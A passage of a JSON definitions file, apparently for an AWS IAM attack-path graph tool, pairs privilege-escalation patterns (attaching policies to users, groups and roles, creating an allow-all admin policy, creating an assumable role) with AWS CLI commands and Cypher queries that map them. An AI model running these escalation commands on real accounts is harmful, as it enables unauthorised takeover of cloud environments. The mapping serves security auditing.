SIZE(COLLECT(DISTINCT edge)) AS size, target WHERE size = 1 WITH results, target,  COLLECT(DISTINCT source) AS sources  WITH results,  COLLECT(DISTINCT [target, sources]) AS pairs  UNWIND pairs AS pair  UNWIND results AS result  WITH results,  result[0] AS source, result[2] AS target,  pair[0] AS t, pair[1] AS s,  TAIL(REVERSE(TAIL(NODES(result[3])))) AS intermediaries  WHERE ALL(_ IN intermediaries WHERE NOT _ IN s)  AND target = t  WITH source, target, results  UNWIND results AS result WITH source, target, result WHERE result[0] = source AND result[2] = target WITH result[0] AS source, result[2] AS target,  result[3] AS path, result[4] AS options,  result[5] AS grants  WITH source, target, options, grants, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies, LAST(EXTRACT(_ IN RELS(path)|_.Name)) AS outcome WITH COLLECT([source, target, options, outcome, REDUCE(commands=[], _ IN dependencies| CASE WHEN _ IN commands THEN commands  ELSE commands + _.Commands END), grants] ) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS target, result[3] AS outcome, MIN(SIZE(result[4])) AS weight UNWIND results AS result WITH result, source, target, outcome, weight WHERE source = result[0] AND target = result[1] AND outcome = result[3] AND weight = SIZE(result[4]) WITH source, target, REDUCE(commands=[], _ IN COLLECT(result[4])| CASE WHEN _ IN commands THEN commands ELSE _ + commands END) AS commands, result[2] AS options, result[5] AS grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands UNWIND options AS option WITH source, target, grants, option[0] AS option,REDUCE(commands=[], _ IN commands + option[1]|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands WITH source, target, commands, grants, [[NULL, []]] AS options WHERE target = option  WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, COLLECT([target, commands]) AS options, grants  MERGE (source)-[:ATTACK{Name:'AttachGroupPolicy'}]-> (pattern:Pattern:AttachGroupPolicy{Name:'AttachGroupPolicy'}) ON CREATE SET  pattern.Requires = ['iam:AttachGroupPolicy'], pattern.Depends = \"AWS::IAM::Group\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam attach-group-policy --group-name ${AWS::IAM::Group} --policy-arn ${AWS::IAM::Policy}.Arn']|REPLACE(REPLACE(_, \"${AWS::IAM::Policy}.Arn\", grant.Arn), \"${AWS::IAM::Group}\", option.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ATTACK{Name:'HasAttachedManagedPolicy'}]->(grant) ON CREATE SET  edge.Description = \"Attaches the specified managed policy to the specified IAM group.\", edge.Commands = commands, edge.Weight = SIZE(commands) WITH pattern, options UNWIND options AS option WITH pattern, option[0] AS option, option[1] AS commands MERGE (pattern)-[edge:OPTION{Name:'Option'}]->(option) ON CREATE SET edge.Weight = SIZE(commands), edge.Commands = commands "
  },
  "AttachRolePolicy": {
    "Description": "Attaches the specified managed policy to the specified IAM role.",
    "Commands": [
      "aws iam attach-role-policy --role-name ${AWS::IAM::Role} --policy-arn ${AWS::IAM::Policy}.Arn"
    ],
    "Attack": {
      "Depends": "AWS::IAM::Role",
      "Requires": [
        "iam:AttachRolePolicy"
      ],
      "Affects": "AWS::IAM::Role",
      "Grants": "AWS::IAM::Policy"
    },
    "Grants": "HasAttachedManagedPolicy",
    "CYPHER": "MATCH path=(source:Resource)-[:TRANSITIVE|ATTACK|CREATE*0..]->(option:`AWS::IAM::Role`) WHERE option:Resource OR option:Generic WITH source, option, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies WITH COLLECT([source, option, REDUCE(commands=[], _ IN dependencies|CASE WHEN _ IN commands THEN commands ELSE commands + _.Commands END)]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS option, MIN(SIZE(result[2])) AS weight UNWIND results AS result WITH result, source, option, weight, result[2] AS commands WHERE source = result[0] AND option = result[1] AND weight = SIZE(result[2]) WITH source, option, commands, weight ORDER BY weight WITH source, COLLECT([option, commands]) AS options OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH source,  options,  REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  MATCH (grants:`AWS::IAM::Policy`) OPTIONAL MATCH path=(source)-[:TRANSITIVE|ATTACK|CREATE*..]->(generic:Generic:`AWS::IAM::Policy`) WHERE grants = generic WITH source, options, admin, CASE WHEN (grants:Resource) OR ((grants:Generic) AND generic = grants) THEN grants END AS grants, path WHERE NOT grants IS NULL WITH source, options, admin, grants, REDUCE(commands=[], _ IN EXTRACT(_ IN FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern)|_.Commands)|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands WITH source, options, admin,  COLLECT([grants, COALESCE(commands,[])]) AS grants MATCH path=(source:`Resource`)-[:TRANSITIVE|ATTACK*0..]->()-[edge]->(target:`AWS::IAM::Role`) WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin) AND edge.Name IN ['iam:AttachRolePolicy'] AND edge.Effect = 'Allow'  AND edge.Conditions IS NULL   WITH COLLECT([source, edge.Name, target, path, options, grants]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS edge, result[2] AS target WITH results, source, SIZE(COLLECT(DISTINCT edge)) AS size, target WHERE size = 1 WITH results, target,  COLLECT(DISTINCT source) AS sources  WITH results,  COLLECT(DISTINCT [target, sources]) AS pairs  UNWIND pairs AS pair  UNWIND results AS result  WITH results,  result[0] AS source, result[2] AS target,  pair[0] AS t, pair[1] AS s,  TAIL(REVERSE(TAIL(NODES(result[3])))) AS intermediaries  WHERE ALL(_ IN intermediaries WHERE NOT _ IN s)  AND target = t  WITH source, target, results  UNWIND results AS result WITH source, target, result WHERE result[0] = source AND result[2] = target WITH result[0] AS source, result[2] AS target,  result[3] AS path, result[4] AS options,  result[5] AS grants  WITH source, target, options, grants, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies, LAST(EXTRACT(_ IN RELS(path)|_.Name)) AS outcome WITH COLLECT([source, target, options, outcome, REDUCE(commands=[], _ IN dependencies| CASE WHEN _ IN commands THEN commands  ELSE commands + _.Commands END), grants] ) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS target, result[3] AS outcome, MIN(SIZE(result[4])) AS weight UNWIND results AS result WITH result, source, target, outcome, weight WHERE source = result[0] AND target = result[1] AND outcome = result[3] AND weight = SIZE(result[4]) WITH source, target, REDUCE(commands=[], _ IN COLLECT(result[4])| CASE WHEN _ IN commands THEN commands ELSE _ + commands END) AS commands, result[2] AS options, result[5] AS grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands UNWIND options AS option WITH source, target, grants, option[0] AS option,REDUCE(commands=[], _ IN commands + option[1]|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands WITH source, target, commands, grants, [[NULL, []]] AS options WHERE target = option  WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, COLLECT([target, commands]) AS options, grants  MERGE (source)-[:ATTACK{Name:'AttachRolePolicy'}]-> (pattern:Pattern:AttachRolePolicy{Name:'AttachRolePolicy'}) ON CREATE SET  pattern.Requires = ['iam:AttachRolePolicy'], pattern.Depends = \"AWS::IAM::Role\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam attach-role-policy --role-name ${AWS::IAM::Role} --policy-arn ${AWS::IAM::Policy}.Arn']|REPLACE(REPLACE(_, \"${AWS::IAM::Policy}.Arn\", grant.Arn), \"${AWS::IAM::Role}\", option.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ATTACK{Name:'HasAttachedManagedPolicy'}]->(grant) ON CREATE SET  edge.Description = \"Attaches the specified managed policy to the specified IAM role.\", edge.Commands = commands, edge.Weight = SIZE(commands) WITH pattern, options UNWIND options AS option WITH pattern, option[0] AS option, option[1] AS commands MERGE (pattern)-[edge:OPTION{Name:'Option'}]->(option) ON CREATE SET edge.Weight = SIZE(commands), edge.Commands = commands "
  },
  "AttachUserPolicy": {
    "Description": "Attaches the specified managed policy to the specified user.",
    "Commands": [
      "aws iam attach-user-policy --user-name ${AWS::IAM::User} --policy-arn ${AWS::IAM::Policy}.Arn"
    ],
    "Attack": {
      "Depends": "AWS::IAM::User",
      "Requires": [
        "iam:AttachUserPolicy"
      ],
      "Affects": "AWS::IAM::User",
      "Grants": "AWS::IAM::Policy"
    },
    "Grants": "HasAttachedManagedPolicy",
    "CYPHER": "MATCH path=(source:Resource)-[:TRANSITIVE|ATTACK|CREATE*0..]->(option:`AWS::IAM::User`) WHERE option:Resource OR option:Generic WITH source, option, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies WITH COLLECT([source, option, REDUCE(commands=[], _ IN dependencies|CASE WHEN _ IN commands THEN commands ELSE commands + _.Commands END)]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS option, MIN(SIZE(result[2])) AS weight UNWIND results AS result WITH result, source, option, weight, result[2] AS commands WHERE source = result[0] AND option = result[1] AND weight = SIZE(result[2]) WITH source, option, commands, weight ORDER BY weight WITH source, COLLECT([option, commands]) AS options OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH source,  options,  REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  MATCH (grants:`AWS::IAM::Policy`) OPTIONAL MATCH path=(source)-[:TRANSITIVE|ATTACK|CREATE*..]->(generic:Generic:`AWS::IAM::Policy`) WHERE grants = generic WITH source, options, admin, CASE WHEN (grants:Resource) OR ((grants:Generic) AND generic = grants) THEN grants END AS grants, path WHERE NOT grants IS NULL WITH source, options, admin, grants, REDUCE(commands=[], _ IN EXTRACT(_ IN FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern)|_.Commands)|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands WITH source, options, admin,  COLLECT([grants, COALESCE(commands,[])]) AS grants MATCH path=(source:`Resource`)-[:TRANSITIVE|ATTACK*0..]->()-[edge]->(target:`AWS::IAM::User`) WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin) AND edge.Name IN ['iam:AttachUserPolicy'] AND edge.Effect = 'Allow'  AND edge.Conditions IS NULL   WITH COLLECT([source, edge.Name, target, path, options, grants]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS edge, result[2] AS target WITH results, source, SIZE(COLLECT(DISTINCT edge)) AS size, target WHERE size = 1 WITH results, target,  COLLECT(DISTINCT source) AS sources  WITH results,  COLLECT(DISTINCT [target, sources]) AS pairs  UNWIND pairs AS pair  UNWIND results AS result  WITH results,  result[0] AS source, result[2] AS target,  pair[0] AS t, pair[1] AS s,  TAIL(REVERSE(TAIL(NODES(result[3])))) AS intermediaries  WHERE ALL(_ IN intermediaries WHERE NOT _ IN s)  AND target = t  WITH source, target, results  UNWIND results AS result WITH source, target, result WHERE result[0] = source AND result[2] = target WITH result[0] AS source, result[2] AS target,  result[3] AS path, result[4] AS options,  result[5] AS grants  WITH source, target, options, grants, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies, LAST(EXTRACT(_ IN RELS(path)|_.Name)) AS outcome WITH COLLECT([source, target, options, outcome, REDUCE(commands=[], _ IN dependencies| CASE WHEN _ IN commands THEN commands  ELSE commands + _.Commands END), grants] ) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS target, result[3] AS outcome, MIN(SIZE(result[4])) AS weight UNWIND results AS result WITH result, source, target, outcome, weight WHERE source = result[0] AND target = result[1] AND outcome = result[3] AND weight = SIZE(result[4]) WITH source, target, REDUCE(commands=[], _ IN COLLECT(result[4])| CASE WHEN _ IN commands THEN commands ELSE _ + commands END) AS commands, result[2] AS options, result[5] AS grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands UNWIND options AS option WITH source, target, grants, option[0] AS option,REDUCE(commands=[], _ IN commands + option[1]|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands WITH source, target, commands, grants, [[NULL, []]] AS options WHERE target = option  WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, COLLECT([target, commands]) AS options, grants  MERGE (source)-[:ATTACK{Name:'AttachUserPolicy'}]-> (pattern:Pattern:AttachUserPolicy{Name:'AttachUserPolicy'}) ON CREATE SET  pattern.Requires = ['iam:AttachUserPolicy'], pattern.Depends = \"AWS::IAM::User\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam attach-user-policy --user-name ${AWS::IAM::User} --policy-arn ${AWS::IAM::Policy}.Arn']|REPLACE(REPLACE(_, \"${AWS::IAM::Policy}.Arn\", grant.Arn), \"${AWS::IAM::User}\", option.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ATTACK{Name:'HasAttachedManagedPolicy'}]->(grant) ON CREATE SET  edge.Description = \"Attaches the specified managed policy to the specified user.\", edge.Commands = commands, edge.Weight = SIZE(commands) WITH pattern, options UNWIND options AS option WITH pattern, option[0] AS option, option[1] AS commands MERGE (pattern)-[edge:OPTION{Name:'Option'}]->(option) ON CREATE SET edge.Weight = SIZE(commands), edge.Commands = commands "
  },
  "CreateGroup": {
    "Description": "Creates a new group",
    "Options": [
      "CreateAction"
    ],
    "Commands": [
      "aws iam create-group --group-name ${AWS::IAM::Group}",
      "aws iam add-user-to-group --user-name ${AWS::IAM::User} --group-name ${AWS::IAM::Group}"
    ],
    "Attack": {
      "Depends": "AWS::IAM::User",
      "Requires": [
        "iam:CreateGroup",
        "iam:AddUserToGroup"
      ],
      "Affects": "AWS::IAM::Group"
    },
    "CYPHER": "MATCH path=(source:Resource)-[:TRANSITIVE|ATTACK|CREATE*0..]->(option:`AWS::IAM::User`) WHERE option:Resource OR option:Generic WITH source, option, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies WITH COLLECT([source, option, REDUCE(commands=[], _ IN dependencies|CASE WHEN _ IN commands THEN commands ELSE commands + _.Commands END)]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS option, MIN(SIZE(result[2])) AS weight UNWIND results AS result WITH result, source, option, weight, result[2] AS commands WHERE source = result[0] AND option = result[1] AND weight = SIZE(result[2]) WITH source, option, commands, weight ORDER BY weight WITH source, COLLECT([option, commands]) AS options OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH source,  options,  REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[:TRANSITIVE|ATTACK*0..]->()-[edge]->(target:`AWS::IAM::Group`:`Generic`) WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin) AND edge.Name IN ['iam:CreateGroup', 'iam:AddUserToGroup'] AND edge.Effect = 'Allow'  AND edge.Conditions IS NULL   WITH COLLECT([source, edge.Name, target, path, options, grants]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS edge, result[2] AS target WITH results, source, SIZE(COLLECT(DISTINCT edge)) AS size, target WHERE size = 2 WITH results, target,  COLLECT(DISTINCT source) AS sources  WITH results,  COLLECT(DISTINCT [target, sources]) AS pairs  UNWIND pairs AS pair  UNWIND results AS result  WITH results,  result[0] AS source, result[2] AS target,  pair[0] AS t, pair[1] AS s,  TAIL(REVERSE(TAIL(NODES(result[3])))) AS intermediaries  WHERE ALL(_ IN intermediaries WHERE NOT _ IN s)  AND target = t  WITH source, target, results  UNWIND results AS result WITH source, target, result WHERE result[0] = source AND result[2] = target WITH result[0] AS source, result[2] AS target,  result[3] AS path, result[4] AS options,  result[5] AS grants  WITH source, target, options, grants, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies, LAST(EXTRACT(_ IN RELS(path)|_.Name)) AS outcome WITH COLLECT([source, target, options, outcome, REDUCE(commands=[], _ IN dependencies| CASE WHEN _ IN commands THEN commands  ELSE commands + _.Commands END), grants] ) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS target, result[3] AS outcome, MIN(SIZE(result[4])) AS weight UNWIND results AS result WITH result, source, target, outcome, weight WHERE source = result[0] AND target = result[1] AND outcome = result[3] AND weight = SIZE(result[4]) WITH source, target, REDUCE(commands=[], _ IN COLLECT(result[4])| CASE WHEN _ IN commands THEN commands ELSE _ + commands END) AS commands, result[2] AS options, result[5] AS grants WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands ORDER BY SIZE(commands) WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'CreateGroup'}]-> (pattern:Pattern:CreateGroup{Name:'CreateGroup'}) ON CREATE SET  pattern.Requires = ['iam:CreateGroup', 'iam:AddUserToGroup'], pattern.Depends = \"AWS::IAM::User\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam create-group --group-name ${AWS::IAM::Group}', 'aws iam add-user-to-group --user-name ${AWS::IAM::User} --group-name ${AWS::IAM::Group}']|REPLACE(REPLACE(REPLACE(_, \"${AWS::IAM::Group}\", grant.Name), \"${AWS::IAM::Group}\", grant.Name), \"${AWS::IAM::User}\", option.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:CREATE{Name:'Create'}]->(grant) ON CREATE SET  edge.Description = \"Creates a new group\", edge.Commands = commands, edge.Weight = SIZE(commands) WITH pattern, options UNWIND options AS option WITH pattern, option[0] AS option, option[1] AS commands MERGE (pattern)-[edge:OPTION{Name:'Option'}]->(option) ON CREATE SET edge.Weight = SIZE(commands), edge.Commands = commands "
  },
  "CreateInstance": {
    "Description": "Launches the specified number of instances using an AMI for which you have permissions.",
    "Options": [
      "CreateAction"
    ],
    "Commands": [
      "aws ec2 run-instances --count 1 --instance-type t2.micro--image-id $ami-id"
    ],
    "Attack": {
      "Requires": [
        "ec2:RunInstances"
      ],
      "Affects": "AWS::EC2::Instance"
    },
    "CYPHER": "OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH  [[NULL, []]] AS options, REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[edge{Name:'ec2:RunInstances', Effect: 'Allow'}]->(target:`AWS::EC2::Instance`:`Generic`)  WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin)  AND edge.Conditions IS NULL   WITH source, target, [] AS commands, options, grants WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands ORDER BY SIZE(commands) WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'CreateInstance'}]-> (pattern:Pattern:CreateInstance{Name:'CreateInstance'}) ON CREATE SET  pattern.Requires = ['ec2:RunInstances'], pattern.Depends = \"\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws ec2 run-instances --count 1 --instance-type t2.micro--image-id $ami-id']|_)|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:CREATE{Name:'Create'}]->(grant) ON CREATE SET  edge.Description = \"Launches the specified number of instances using an AMI for which you have permissions.\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "CreateInstanceProfile": {
    "Description": "Creates a new instance profile",
    "Options": [
      "CreateAction"
    ],
    "Commands": [
      "aws iam create-instance-profile --instance-profile-name ${AWS::IAM::InstanceProfile}"
    ],
    "Attack": {
      "Requires": [
        "iam:CreateInstanceProfile"
      ],
      "Affects": "AWS::IAM::InstanceProfile"
    },
    "CYPHER": "OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH  [[NULL, []]] AS options, REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[edge{Name:'iam:CreateInstanceProfile', Effect: 'Allow'}]->(target:`AWS::IAM::InstanceProfile`:`Generic`)  WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin)  AND edge.Conditions IS NULL   WITH source, target, [] AS commands, options, grants WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands ORDER BY SIZE(commands) WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'CreateInstanceProfile'}]-> (pattern:Pattern:CreateInstanceProfile{Name:'CreateInstanceProfile'}) ON CREATE SET  pattern.Requires = ['iam:CreateInstanceProfile'], pattern.Depends = \"\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam create-instance-profile --instance-profile-name ${AWS::IAM::InstanceProfile}']|REPLACE(_, \"${AWS::IAM::InstanceProfile}\", grant.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:CREATE{Name:'Create'}]->(grant) ON CREATE SET  edge.Description = \"Creates a new instance profile\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "CreatePolicy": {
    "Description": "Create a new managed policy.",
    "Options": [
      "CreateAction"
    ],
    "Commands": [
      "aws iam create-policy --policy-name $policy-name --policy-document file://<(cat <<EOF\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"Admin\",\n            \"Effect\": \"Allow\",\n            \"Action\": \"*\",\n            \"Resource\": \"*\"\n        }]\n}\nEOF\n)"
    ],
    "Attack": {
      "Requires": [
        "iam:CreatePolicy"
      ],
      "Affects": "AWS::IAM::Policy"
    },
    "CYPHER": "OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH  [[NULL, []]] AS options, REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[edge{Name:'iam:CreatePolicy', Effect: 'Allow'}]->(target:`AWS::IAM::Policy`:`Generic`)  WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin)  AND edge.Conditions IS NULL   WITH source, target, [] AS commands, options, grants WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands ORDER BY SIZE(commands) WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'CreatePolicy'}]-> (pattern:Pattern:CreatePolicy{Name:'CreatePolicy'}) ON CREATE SET  pattern.Requires = ['iam:CreatePolicy'], pattern.Depends = \"\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam create-policy --policy-name $policy-name --policy-document file://<(cat <<EOF\\n{\\n    \"Version\": \"2012-10-17\",\\n    \"Statement\": [\\n        {\\n            \"Sid\": \"Admin\",\\n            \"Effect\": \"Allow\",\\n            \"Action\": \"*\",\\n            \"Resource\": \"*\"\\n        }]\\n}\\nEOF\\n)']|_)|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:CREATE{Name:'Create'}]->(grant) ON CREATE SET  edge.Description = \"Create a new managed policy.\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "CreateRole": {
    "Description": "Creates a new role that can be assumed.",
    "Options": [
      "CreateAction"
    ],
    "Commands": [
      "aws iam create-role --role-name ${AWS::IAM::Role} --assume-role-policy-document *"
    ],
    "Attack": {
      "Requires": [
        "iam:CreateRole"
      ],
      "Affects": "AWS::IAM::Role"
    },
    "Grants": "AssumeRole",
    "CYPHER": "OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH  [[NULL, []]] AS options, REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[edge{Name:'iam:CreateRole', Effect: 'Allow'}]->(target:`AWS::IAM::Role`:`Generic`)  WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin)  AND edge.Conditions IS NULL   WITH source, target, [] AS commands, options, grants WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands ORDER BY SIZE(commands) WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'CreateRole'}]-> (pattern:Pattern:CreateRole{Name:'CreateRole'}) ON CREATE SET  pattern.Requires = ['iam:CreateRole'], pattern.Depends = \"\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam create-role --role-name ${AWS::IAM::Role} --assume-role-policy-document *']|REPLACE(_, \"${AWS::IAM::Role}\", grant.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS 